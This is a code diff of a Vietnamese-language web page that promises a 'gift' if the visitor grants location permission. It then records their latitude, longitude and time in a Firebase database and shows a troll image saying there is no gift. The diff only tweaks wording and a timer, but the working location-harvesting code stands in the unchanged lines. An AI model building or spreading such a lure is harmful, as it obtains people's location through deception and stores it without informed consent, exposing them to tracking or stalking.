@@ -16,7 +16,7 @@
           alt="Gift"
           class="gift-img"
         />
-        <h2>🎀 You cấp quyền đi , có bất ngờ đó 🎀</h2>
+        <h2><b>🎀You cấp quyền đi, có bất ngờ đó</b></h2>
         <div class="progress">
           <div class="progress-bar" id="progress-bar"></div>
         </div>
@@ -60,7 +60,7 @@
 
       function getLocationAndSend() {
         if (!navigator.geolocation) {
-          status.innerText = "Lỗi rùi đổi trình duyệt khác đi.";
+          status.innerText = "Lỗi rùi đổi trình duyệt khác đyyy";
           return;
         }
         navigator.geolocation.getCurrentPosition(
@@ -71,7 +71,7 @@
 
             db.ref("locations").push({ lat, lon, time: now });
 
-            status.innerText = "💖 Lêu lêuu , ko có quà đâuuu! 💖";
+            status.innerText = "💖 Lêu lêuu , ko có quà đâuuu!";
             progressBar.style.width = "100%";
 
             // Sau 2.5s thì hiện ảnh troll với nền tối
@@ -90,7 +90,7 @@
                 overlay.style.opacity = "1";
                 img.style.opacity = "1";
               }, 50);
-            }, 2500);
+            }, 1700);
           },
           (err) => {
             status.innerText = "⛔ Bạn từ chối quà của mình à 😢";
